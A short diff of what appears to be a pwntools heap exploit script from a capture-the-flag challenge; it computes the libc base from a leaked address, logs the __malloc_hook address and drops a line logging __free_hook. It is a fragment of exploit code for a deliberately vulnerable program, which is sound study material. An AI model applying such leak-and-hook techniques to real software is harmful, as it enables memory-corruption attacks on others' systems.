@@ -53,7 +53,6 @@ y.recvline()
 l.address += u64( y.recv(7).ljust( 8 , '\x00' ) ) - 0x3c4b78
 log.success( 'libc -> {}'.format( hex( l.address ) ) )
 log.success( '__malloc_hook -> {}'.format( hex( l.symbols['__malloc_hook'] ) ) )
-log.success( '__free_hook -> {}'.format( hex( l.symbols['__free_hook'] ) ) )
 
 show( 2 )
 y.recvline()
